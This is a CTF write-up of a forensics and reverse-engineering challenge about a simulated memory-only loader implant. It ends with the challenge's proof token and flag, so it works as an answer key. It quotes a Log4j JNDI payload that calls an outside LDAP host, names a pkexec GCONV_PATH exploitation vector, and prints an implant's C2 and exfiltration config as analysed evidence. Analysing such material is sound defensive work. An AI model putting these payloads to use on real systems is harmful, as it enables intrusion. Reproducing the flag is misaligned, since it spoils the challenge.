# BurhanGuild Loader Incident - CTF Writeup

- **Category:** Digital Forensics & Incident Response (DFIR) / Reverse Engineering
- **Challenge Service:** `nc 34.2.147.230 7010`
- **Flag:** `COMPFEST18{8urh4n9u1ld_0r10n_148_m3m0ry_0n1y_104d3r_c453_c1053d_4f73r_5upp1y_ch41n_7r4c3_826df6b2a62673a1a6cbbb1c63244dd8ddc2933381f52723343274716fabde}`

---

## 1. Challenge Overview

We are provided with an incident response triage package containing:
- `artifacts/integrity_manifest.json`: Metadata for volatile captures and deleted-storage pages.
- `artifacts/captures/`: Five raw memory captures (`capture_2C91.raw`, `capture_7F3A.raw`, `capture_91BE.raw`, `capture_A812.raw`, `capture_D044.raw`).
- `artifacts/deleted_pages/`: Carved deleted disk/swap pages (`page_00.bin` through `page_07.bin`).
- `plugins/bgloader_hunt.py`: An inspection CLI helper parsing the proprietary `BGMR` v3 capture format.
- `yara/burhanguild_memory_rules.yar`: YARA detection rule targeting the memory loader implant.

Connecting to `nc 34.2.147.230 7010` presents a case closure questionnaire asking for a structured incident proof token:
```text
Format: BGLPROOF{structured incident proof token}
```

---

## 2. Memory Capture Triage & Host Correlation

Using `plugins/bgloader_hunt.py`, we inspect each capture across all available views (`metadata`, `processes`, `environment`, `heap`, `maps`, `network`, `files`, `supply`):

```bash
python3 plugins/bgloader_hunt.py -f artifacts/captures/capture_A812.raw metadata
python3 plugins/bgloader_hunt.py -f artifacts/captures/capture_A812.raw processes
python3 plugins/bgloader_hunt.py -f artifacts/captures/capture_A812.raw maps
python3 plugins/bgloader_hunt.py -f artifacts/captures/capture_A812.raw network
python3 plugins/bgloader_hunt.py -f artifacts/captures/capture_A812.raw files
python3 plugins/bgloader_hunt.py -f artifacts/captures/capture_A812.raw environment
python3 plugins/bgloader_hunt.py -f artifacts/captures/capture_A812.raw heap
```

### Key Findings in `capture_A812.raw`:
1. **Target Host:** `orion-lab` (matches `integrity_manifest.json`).
2. **Process Hierarchy & Masquerading:**
   - PID `4693` (`java`) executed `pkexec` (PID `4742`), which spawned hidden process PID `4787` masquerading as `[kworker/u8:7]`.
3. **Environment & Mutex:**
   - Process `4787` holds environment variable `BG_MUTEX = bguild-ce104cb0`.
   - Process `4742` has `GCONV_PATH = /tmp/.bg/gconv` (CVE-2021-4034 exploitation vector).
4. **Memory Mappings:**
   - PID `4787` maps an executable shared object from anonymous memory:
     - **VMA:** `0x7f100008f000` (`rwxp`)
     - **Name:** `memfd:libpam_bg.so (deleted)`
     - **Build ID:** `542715c2e46252e4d790`
     - **Region SHA256:** `1858064aa10396aafa565583707a0084c21370868e26d93b63309133687be223`
5. **Network Connection:**
   - Active established connection from PID `4787` (`10.10.18.26:42110`) to C2 endpoint: `morrow-gate.wreckit.invalid:8443`.
6. **Open/Deleted Files:**
   - FD 3 pointing to `/dev/shm/.bg-cache/e0bafe9e.zip` (Evidence Ref: `EV-B1DC93988DBC`).
7. **Heap Artifacts:**
   - JNDI exploit string in Java heap: `${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://172.19.0.66:1389/BurhanGuild}` (CVE-2021-44228 Log4j).
   - 8-byte heap token / salt: `a01fb1f61e9116a6`.

---

## 3. Deleted Storage Page Analysis

We search `artifacts/deleted_pages/` for ZIP archive signatures (`PK\x03\x04` / `PK\x05\x06`) corresponding to the deleted staging cache archives:

```python
import zipfile, io, hashlib
from pathlib import Path

for p in sorted(Path("artifacts/deleted_pages").glob("*.bin")):
    data = p.read_bytes()
    idx = 0
    while True:
        pos = data.find(b"PK\x03\x04", idx)
        if pos == -1: break
        eocd = data.find(b"PK\x05\x06", pos)
        if eocd != -1:
            zip_data = data[pos:eocd+22]
            try:
                zf = zipfile.ZipFile(io.BytesIO(zip_data))
                if "case_fragment.json" in zf.namelist():
                    cf = zf.read("case_fragment.json").decode()
                    h = hashlib.sha256(zip_data).hexdigest()
                    print(f"{p.name} [{len(zip_data)} bytes] SHA256: {h}")
                    print(f"  {cf.strip()}")
            except Exception:
                pass
        idx = pos + 1
```

### Result:
In `page_05.bin` at offset `0x603a2`, we carve the archive for `capture_A812` / `EV-B1DC93988DBC`:
```json
{
  "capture_id": "A812",
  "case_id": "BG-IR-2026-0505",
  "collection": "gateway-transfer",
  "evidence_ref": "EV-B1DC93988DBC",
  "host": "orion-lab",
  "sequence": "ed75ca67fea0a59a"
}
```
- **Archive Size:** 473 bytes
- **Archive SHA256:** `4bd20e26a2e63e75af61b07af3cf5dc219ca11a018588a3ce0ee4564338cf64a`

---

## 4. Reversing the In-Memory Implant (`capture_A812.so`)

We carve the executable payload using `bgloader_hunt.py`:
```bash
python3 plugins/bgloader_hunt.py -f artifacts/captures/capture_A812.raw -o capture_A812.so carve-region
```

Disassembling `capture_A812.so` reveals an exportless ELF library with:
- **Function at `0x1500`:** Main decryptor entrypoint taking:
  - `rdi`: Mutex string / key (`bguild-ce104cb0`)
  - `rsi`: Heap salt (8 bytes: `a01fb1f61e9116a6`)
  - `rdx`: Build ID (10 bytes: `542715c2e46252e4d790`)
  - `rcx`: Destination output buffer
  - `r8`: Expected length (`0x22e` / 558 bytes)
- **Function at `0x1100`:** Non-linear key schedule combining the mutex, salt, and build ID into four 32-bit TEA keys.
- **Function at `0x13e0`:** A 32-round TEA/XTEA variant cipher running in counter mode across the 558-byte encrypted blob stored in `.rodata` at offset `0x2028`.

### Decrypting the Embedded Configuration
We can invoke the routine directly using an anonymous `mmap` C harness or native Python simulation:

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>

typedef int (*dec_fn)(const char *mut, const char *heap, const char *bid, char *out, size_t len);

int main() {
    int fd = open("capture_A812.so", O_RDONLY);
    off_t size = lseek(fd, 0, SEEK_END);
    lseek(fd, 0, SEEK_SET);
    void *mem = mmap(NULL, size, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    read(fd, mem, size);
    close(fd);

    dec_fn fn = (dec_fn)((char *)mem + 0x1500);
    char out[1024] = {0};
    fn("bguild-ce104cb0", "\xa0\x1f\xb1\xf6\x1e\x91\x16\xa6", "\x54\x27\x15\xc2\xe4\x62\x52\xe4\xd7\x90", out, 558);
    printf("%s\n", out);
}
```

### Decrypted Configuration:
```json
{
  "c2_domain": "morrow-gate.wreckit.invalid",
  "c2_port": 8443,
  "campaign": "side-door-crown",
  "closure_contract": {
    "digest_algorithm": "sha256",
    "digest_fields": [
      "jndi_normalized",
      "build_id",
      "implant_id",
      "c2_domain",
      "archive_sha256"
    ],
    "digest_separator": "|",
    "token_schema": "BGLPROOF{orion-lab__cap-{capture_id}__loader-{loader_pid}__implant-{implant_id}__build-{build_id}__config-{config_sha256}__archive-{archive_sha256}__digest-{digest}}"
  },
  "crc32": "b41d727b",
  "exfil_path": "/api/v3/guild/sync",
  "implant_id": "BG-94C2A04EC6",
  "magic": "BGCF",
  "sleep_jitter": 37,
  "version": 3
}
```

---

## 5. Token Reconstruction & Submission

Following the `closure_contract`:
1. **Schema:** `BGLPROOF{orion-lab__cap-{capture_id}__loader-{loader_pid}__implant-{implant_id}__build-{build_id}__config-{config_sha256}__archive-{archive_sha256}__digest-{digest}}`
2. **Parameters:**
   - `capture_id`: `A812`
   - `loader_pid`: `4787`
   - `implant_id`: `BG-94C2A04EC6`
   - `build_id`: `542715c2e46252e4d790`
   - `c2_domain`: `morrow-gate.wreckit.invalid`
   - `archive_sha256`: `4bd20e26a2e63e75af61b07af3cf5dc219ca11a018588a3ce0ee4564338cf64a`
   - `config_sha256`: `sha256(raw_config_bytes)` = `360251a5def08d12cb71e72d5a1609b0d34c9dfc9520197ad8b0cc2cd7cfb76b`
3. **Digest Calculation:**
   - Normalized JNDI: `${jndi:ldap://172.19.0.66:1389/BurhanGuild}`
   - `digest_input` = `${jndi:ldap://172.19.0.66:1389/BurhanGuild}|542715c2e46252e4d790|BG-94C2A04EC6|morrow-gate.wreckit.invalid|4bd20e26a2e63e75af61b07af3cf5dc219ca11a018588a3ce0ee4564338cf64a`
   - `digest` = `sha256(digest_input)` = `836d4fce93ec7b3077ab7c97820d29515ea5609cf346e40b76973ca37e2418ed`

### Constructed Token:
```text
BGLPROOF{orion-lab__cap-A812__loader-4787__implant-BG-94C2A04EC6__build-542715c2e46252e4d790__config-360251a5def08d12cb71e72d5a1609b0d34c9dfc9520197ad8b0cc2cd7cfb76b__archive-4bd20e26a2e63e75af61b07af3cf5dc219ca11a018588a3ce0ee4564338cf64a__digest-836d4fce93ec7b3077ab7c97820d29515ea5609cf346e40b76973ca37e2418ed}
```

Submitting the token to `nc 34.2.147.230 7010` solves the case and yields the flag:
```text
✔ CORRECT
COMPFEST18{8urh4n9u1ld_0r10n_148_m3m0ry_0n1y_104d3r_c453_c1053d_4f73r_5upp1y_ch41n_7r4c3_826df6b2a62673a1a6cbbb1c63244dd8ddc2933381f52723343274716fabde}
```
